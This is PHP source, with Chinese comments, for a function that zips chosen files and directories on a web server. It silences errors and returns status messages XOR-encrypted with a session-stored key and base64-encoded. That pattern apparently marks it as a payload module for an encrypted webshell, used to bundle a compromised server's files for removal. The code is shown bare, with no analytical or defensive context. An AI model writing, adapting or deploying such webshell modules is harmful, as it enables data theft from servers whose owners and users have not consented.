error_reporting(0);
function main($srcPath = "", $toPath = "")
{
    session_start();
	$key=$_SESSION['k'];
    
    try {
        // 检查输入参数
        if (empty($srcPath) || empty($toPath)) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 检查源路径是否存在
        if (!file_exists($srcPath)) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 检查目标目录是否可写
        $targetDir = dirname($toPath);
        if (!is_writable($targetDir)) {
            echo encrypt("False", $key);
            return false;
        }
        
        $fileList = explode(",", $srcPath);
        $zip = new ZipArchive();
        
        // 尝试创建ZIP文件
        $result = $zip->open($toPath, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        if ($result !== TRUE) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 处理文件列表
        foreach ($fileList as $file) {
            $file = trim($file);
            if (empty($file)) continue;
            
            // 检查文件/目录是否存在且可读
            if (!file_exists($file) || !is_readable($file)) {
                $zip->close();
                echo encrypt("False", $key);
                return false;
            }
            
            if (is_file($file)) {
                // 添加单个文件
                if (!$zip->addFile($file, basename($file))) {
                    $zip->close();
                    echo encrypt("False", $key);
                    return false;
                }
            } else if (is_dir($file)) {
                // 处理目录
                $isend = (substr($file, -1) === "/");
                if ($isend) {
                    $fdic = substr($file, 0, -1);
                } else {
                    $fdic = $file;
                }
                $cdic = basename($fdic);
                
                if (!addFileToZip($cdic, $fdic, $fdic, $zip)) {
                    $zip->close();
                    echo encrypt("False", $key);
                    return false;
                }
            }
        }
        
        // 关闭ZIP文件
        if (!$zip->close()) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 验证ZIP文件是否成功创建
        if (file_exists($toPath) && filesize($toPath) > 0) {
            echo encrypt("Success", $key);
            return true;
        } else {
            echo encrypt("False", $key);
            return false;
        }
        
    } catch (Exception $e) {
        echo encrypt("False", $key);
        return false;
    } catch (Error $e) {
        echo encrypt("False", $key);
        return false;
    }
}

function addFileToZip($cdic, $root, $path, $zip)
{
    try {
        if (!is_dir($path) || !is_readable($path)) {
            return false;
        }
        
        $handler = opendir($path);
        if (!$handler) {
            return false;
        }
        
        while (($filename = readdir($handler)) !== false) {
            if ($filename != "." && $filename != "..") {
                $cpath = $path . "/" . $filename;
                
                // 检查权限
                if (!is_readable($cpath)) {
                    continue; // 跳过无权限的文件
                }
                
                $relativePath = str_replace($root, "", $cpath);
                $capath = $cdic . $relativePath;
                
                if (is_dir($cpath)) {
                    // 添加空目录
                    if (!$zip->addEmptyDir($capath)) {
                        closedir($handler);
                        return false;
                    }
                    // 递归处理子目录
                    if (!addFileToZip($cdic, $root, $cpath, $zip)) {
                        closedir($handler);
                        return false;
                    }
                } else if (is_file($cpath)) {
                    // 添加文件
                    if (!$zip->addFile($cpath, $capath)) {
                        closedir($handler);
                        return false;
                    }
                }
            }
        }
        
        closedir($handler);
        return true;
        
    } catch (Exception $e) {
        return false;
    }
}

function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+5&15];
    }
	return base64_encode($data);
}


// 使用示例
// main("file1.txt,file2.txt,folder1/", "archive.zip");